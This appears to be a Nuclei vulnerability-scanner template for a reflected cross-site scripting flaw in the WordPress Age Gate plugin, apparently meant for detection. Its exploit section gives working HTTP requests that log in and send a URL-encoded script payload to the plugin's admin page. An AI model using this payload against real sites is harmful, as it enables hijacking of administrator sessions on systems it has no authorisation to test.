# Nuclei Template: WordPress Age Gate <2.20.4 - Cross-Site Scripting
**Template ID:** age-gate-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`age-gate-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Age Gate plugin before 2.20.4 contains a cross-site scripting vulnerability. The plugin does not escape some URLs before outputting them back in attributes.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=age-gate&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/a13148fe-ffc9-4003-a44d-652624ba5535
- https://wordpress.org/plugins/age-gate/
